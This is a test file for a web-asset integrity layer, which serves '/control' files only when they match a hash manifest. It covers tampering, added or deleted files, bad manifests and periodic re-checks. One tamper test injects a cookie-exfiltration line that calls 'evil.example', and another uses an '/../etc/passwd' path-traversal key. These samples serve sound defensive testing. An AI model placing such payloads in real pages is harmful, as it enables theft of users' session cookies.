// 6.99.31 (Phase 6): served-asset integrity for /control. Real files on disk, a real listener,
// the real static layer. The rule under test: only bytes that matched the pack-time manifest are
// ever served, on every request, not only at boot.
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import express from 'express'
import { execFileSync } from 'node:child_process'
import fs from 'node:fs'
import http from 'node:http'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import type { AddressInfo } from 'node:net'
import { buildWebAssetTable, createWebControlStatic } from './web-control-static.js'
import { computeWebControlManifest, INTEGRITY_ERROR_PAGE, WEB_CONTROL_MANIFEST_FILE, WebControlIntegrity, webControlIntegrityEnabled } from './web-control-integrity.js'

const here = path.dirname(fileURLToPath(import.meta.url))
const REAL_DIR = path.join(here, '..', 'web-control')
const SCRIPT = path.join(here, '..', 'scripts', 'write-web-control-manifest.mjs')

const APP_JS = 'console.log("the real app")\n'
const INDEX = '<!doctype html><script src="/control/app.js"></script>\n'

let root: string
let dir: string
const closers: Array<() => Promise<void>> = []

beforeEach(() => {
  // A space and a dot component, like "~/Library/Application Support/COS Control/.../node_modules".
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'wc integrity .gen-'))
  dir = path.join(root, 'web-control')
  fs.mkdirSync(path.join(dir, 'panes'), { recursive: true })
  fs.writeFileSync(path.join(dir, 'index.html'), INDEX)
  fs.writeFileSync(path.join(dir, 'app.js'), APP_JS)
  fs.writeFileSync(path.join(dir, 'panes', 'work.js'), 'export const w = 1\n')
  fs.writeFileSync(path.join(dir, 'app.css'), 'body{color:red}\n')
  fs.writeFileSync(path.join(dir, 'skip-me.test.ts'), 'never shipped\n')
  fs.writeFileSync(path.join(dir, WEB_CONTROL_MANIFEST_FILE), JSON.stringify(computeWebControlManifest(dir)))
})
afterEach(async () => {
  for (const c of closers.splice(0)) await c()
  fs.rmSync(root, { recursive: true, force: true })
})

function get(port: number, urlPath: string): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port, path: urlPath, method: 'GET', headers: { 'accept-encoding': 'identity' } }, (res) => {
      const chunks: Buffer[] = []
      res.on('data', c => chunks.push(c))
      res.on('end', () => resolve({ status: res.statusCode || 0, body: Buffer.concat(chunks).toString('utf8') }))
    })
    req.on('error', reject)
    req.end()
  })
}

async function serve(integrity: WebControlIntegrity, recheckMs = 0): Promise<number> {
  const app = express()
  const handler = createWebControlStatic(dir, { integrity, integrityRecheckMs: recheckMs })
  // A disk server behind it must never be reached in integrity mode.
  app.use('/control', handler, (_req, res) => { res.status(299).send('FELL THROUGH TO DISK') })
  const server = await new Promise<http.Server>(r => { const s = app.listen(0, '127.0.0.1', () => r(s)) })
  closers.push(() => new Promise<void>(r => { handler.stop(); server.close(() => r()) }))
  return (server.address() as AddressInfo).port
}

const quiet = { log: () => {} }

describe('integrity mode', () => {
  it('serves the verified files', async () => {
    const integrity = new WebControlIntegrity(dir, quiet)
    expect(integrity.state).toMatchObject({ ok: true, mismatches: [] })
    const port = await serve(integrity)
    expect(await get(port, '/control/app.js')).toEqual({ status: 200, body: APP_JS })
    expect((await get(port, '/control/')).status).toBe(200)
  })

  it('a tampered file is refused (integrity-error page, every path), and the restored file is served again', async () => {
    const integrity = new WebControlIntegrity(dir, quiet)
    const port = await serve(integrity)
    fs.writeFileSync(path.join(dir, 'app.js'), 'fetch("https://evil.example/" + document.cookie)\n')
    // Between checks, the disk edit is never served: the bytes come from the verified snapshot.
    expect(await get(port, '/control/app.js')).toEqual({ status: 200, body: APP_JS })
    expect(integrity.check()).toMatchObject({ ok: false, error: 'files_mismatch', mismatches: [{ path: '/app.js', problem: 'changed' }] })
    for (const p of ['/control/app.js', '/control/', '/control/index.html', '/control/panes/work.js']) {
      expect(await get(port, p)).toEqual({ status: 503, body: INTEGRITY_ERROR_PAGE })
    }
    fs.writeFileSync(path.join(dir, 'app.js'), APP_JS)
    expect(integrity.check()).toMatchObject({ ok: true })
    expect(await get(port, '/control/app.js')).toEqual({ status: 200, body: APP_JS })
  })

  it('tampered BEFORE boot: refused from the first request', async () => {
    fs.writeFileSync(path.join(dir, 'panes', 'work.js'), 'export const w = 2\n')
    const integrity = new WebControlIntegrity(dir, quiet)
    expect(integrity.state).toMatchObject({ ok: false, mismatches: [{ path: '/panes/work.js', problem: 'changed' }] })
    const port = await serve(integrity)
    expect((await get(port, '/control/app.js')).status).toBe(503)
    // Restored: the next check rebuilds from the verified bytes, never from the earlier tampered read.
    fs.writeFileSync(path.join(dir, 'panes', 'work.js'), 'export const w = 1\n')
    integrity.check()
    expect(await get(port, '/control/panes/work.js')).toEqual({ status: 200, body: 'export const w = 1\n' })
  })

  it('an added file or a deleted file is refused; nothing outside the manifest is ever served from disk', async () => {
    const integrity = new WebControlIntegrity(dir, quiet)
    const port = await serve(integrity)
    fs.writeFileSync(path.join(dir, 'signer.js'), 'evil()\n')
    expect(integrity.check().mismatches).toEqual([{ path: '/signer.js', problem: 'unexpected' }])
    fs.rmSync(path.join(dir, 'signer.js'))
    fs.rmSync(path.join(dir, 'app.css'))
    expect(integrity.check().mismatches).toEqual([{ path: '/app.css', problem: 'missing' }])
    fs.writeFileSync(path.join(dir, 'app.css'), 'body{color:red}\n')
    expect(integrity.check().ok).toBe(true)
    const res = await get(port, '/control/nothing-here.txt')
    expect(res.status).toBe(404)
    expect(res.body).not.toContain('FELL THROUGH')
  })

  it('no manifest, or a manifest that is not one: /control is refused', async () => {
    fs.rmSync(path.join(dir, WEB_CONTROL_MANIFEST_FILE))
    const missing = new WebControlIntegrity(dir, quiet)
    expect(missing.state).toMatchObject({ ok: false, error: 'manifest_missing' })
    expect((await get(await serve(missing), '/control/app.js')).status).toBe(503)
    fs.writeFileSync(path.join(dir, WEB_CONTROL_MANIFEST_FILE), JSON.stringify({ v: 1, algorithm: 'sha256', files: { '/../etc/passwd': 'a'.repeat(64) } }))
    expect(new WebControlIntegrity(dir, quiet).state).toMatchObject({ ok: false, error: 'manifest_invalid' })
  })

  it('the manifest is read once at boot: rewriting it with the tampered hash later does not help', async () => {
    const integrity = new WebControlIntegrity(dir, quiet)
    fs.writeFileSync(path.join(dir, 'app.js'), 'evil()\n')
    fs.writeFileSync(path.join(dir, WEB_CONTROL_MANIFEST_FILE), JSON.stringify(computeWebControlManifest(dir)))
    expect(integrity.check()).toMatchObject({ ok: false, mismatches: [{ path: '/app.js', problem: 'changed' }] })
  })

  it('the periodic re-check catches a tampered file on its own', async () => {
    const integrity = new WebControlIntegrity(dir, quiet)
    const port = await serve(integrity, 25)
    fs.writeFileSync(path.join(dir, 'app.js'), 'evil()\n')
    for (let i = 0; i < 100 && integrity.state.ok; i += 1) await new Promise(r => setTimeout(r, 10))
    expect(await get(port, '/control/app.js')).toEqual({ status: 503, body: INTEGRITY_ERROR_PAGE })
  })

  it('in integrity mode the table is built only from the verified bytes, never from disk', () => {
    fs.writeFileSync(path.join(dir, 'app.js'), 'on disk now\n')
    const table = buildWebAssetTable(dir, '/control', new Map([['/app.js', Buffer.from(APP_JS)], ['/.hidden.js', Buffer.from('x')]]))
    expect(table.get('/app.js')?.body.toString('utf8')).toBe(APP_JS)
    expect([...table.keys()]).toEqual(['/app.js'])
  })

  it('status reports what Control audits: the manifest hash, the file count and the mismatches', () => {
    const integrity = new WebControlIntegrity(dir, quiet)
    expect(integrity.status()).toMatchObject({ enabled: true, ok: true, files: 4, manifestSha256: expect.stringMatching(/^[0-9a-f]{64}$/) })
  })
})

describe('the pack step', () => {
  it('the .mjs script writes exactly what computeWebControlManifest computes (tests excluded)', () => {
    fs.rmSync(path.join(dir, WEB_CONTROL_MANIFEST_FILE))
    execFileSync(process.execPath, [SCRIPT, dir], { stdio: 'ignore' })
    const written = JSON.parse(fs.readFileSync(path.join(dir, WEB_CONTROL_MANIFEST_FILE), 'utf8'))
    expect(written).toEqual(computeWebControlManifest(dir))
    expect(Object.keys(written.files)).not.toContain('/skip-me.test.ts')
    expect(Object.keys(written.files).sort()).toEqual(['/app.css', '/app.js', '/index.html', '/panes/work.js'])
  })

  it('the real web-control tree verifies against its own manifest', () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'wc-real-'))
    try {
      fs.cpSync(REAL_DIR, path.join(tmp, 'web-control'), { recursive: true })
      const copy = path.join(tmp, 'web-control')
      fs.writeFileSync(path.join(copy, WEB_CONTROL_MANIFEST_FILE), JSON.stringify(computeWebControlManifest(copy)))
      expect(new WebControlIntegrity(copy, quiet).state).toMatchObject({ ok: true })
    } finally { fs.rmSync(tmp, { recursive: true, force: true }) }
  })
})

describe('the switch', () => {
  it('off by default; on with COS_WEB_CONTROL_INTEGRITY=1, or by default with COS_WEB_KEY_AUTHORITY=1; =0 wins', () => {
    expect(webControlIntegrityEnabled({})).toBe(false)
    expect(webControlIntegrityEnabled({ COS_WEB_CONTROL_INTEGRITY: '1' })).toBe(true)
    expect(webControlIntegrityEnabled({ COS_WEB_KEY_AUTHORITY: '1' })).toBe(true)
    expect(webControlIntegrityEnabled({ COS_WEB_KEY_AUTHORITY: '1', COS_WEB_CONTROL_INTEGRITY: '0' })).toBe(false)
  })
})
